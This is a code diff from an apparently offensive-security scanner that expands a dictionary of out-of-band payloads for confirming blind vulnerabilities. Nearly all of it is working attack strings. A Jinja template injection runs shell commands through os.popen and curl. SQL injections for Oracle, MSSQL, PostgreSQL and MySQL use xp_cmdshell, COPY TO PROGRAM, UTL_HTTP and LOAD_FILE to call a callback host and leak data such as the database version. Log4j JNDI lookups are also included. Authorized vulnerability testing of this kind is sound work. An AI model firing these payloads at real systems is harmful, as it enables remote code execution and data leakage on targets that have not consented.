@@ -16,17 +16,13 @@ Princípio: Sem OOB, testes blind são apenas suposições!
 
 import asyncio
 import hashlib
-import json
 import secrets
-import socket
 import time
 from dataclasses import dataclass, field
 from datetime import datetime, timedelta
-from enum import Enum, auto
+from enum import Enum
 from threading import Thread
-from typing import Optional, List, Dict, Any, Callable, Set
-from urllib.parse import urljoin, urlparse
-import base64
+from typing import Optional, List, Dict, Any
 
 
 class OOBProtocol(Enum):
@@ -163,10 +159,22 @@ class OOBPayloadGenerator:
         "ssti_jinja_http": "{{% import 'os' %}}{{% set _ = os.popen('curl http://{callback_host}/{token}').read() %}}",
         "ssti_jinja_dns": "{{% import 'os' %}}{{% set _ = os.popen('nslookup {token}.{callback_domain}').read() %}}",
         
-        # Blind SQLi with OOB
+        # Blind SQLi with OOB (2026-02-12: Expanded coverage)
+        # Oracle OOB
         "sqli_oracle_http": "SELECT UTL_HTTP.REQUEST('http://{callback_host}/{token}') FROM DUAL",
+        "sqli_oracle_dns": "SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{callback_domain}') FROM DUAL",
+        "sqli_oracle_utl": "' UNION SELECT UTL_HTTP.REQUEST('http://{callback_host}/{token}') FROM DUAL--",
+        # MSSQL OOB
         "sqli_mssql_dns": "EXEC master..xp_dirtree '//{token}.{callback_domain}/a'",
-        
+        "sqli_mssql_http": "EXEC master..xp_cmdshell 'nslookup {token}.{callback_domain}'",
+        "sqli_mssql_linked": "SELECT * FROM OPENROWSET('SQLOLEDB','server={token}.{callback_domain}','SELECT 1')",
+        # PostgreSQL OOB
+        "sqli_postgres_dns": "COPY (SELECT '{token}') TO PROGRAM 'nslookup {token}.{callback_domain}'",
+        "sqli_postgres_http": "CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host={callback_host} dbname={token}')",
+        # MySQL OOB
+        "sqli_mysql_dns": "SELECT LOAD_FILE(CONCAT('//','{token}.{callback_domain}/',VERSION()))",
+        "sqli_mysql_into": "SELECT * INTO OUTFILE '//{token}.{callback_domain}/a' FROM dual",
+
         # Log4j / JNDI
         "jndi_ldap": "${{jndi:ldap://{callback_host}/{token}}}",
         "jndi_dns": "${{jndi:dns://{token}.{callback_domain}}}",
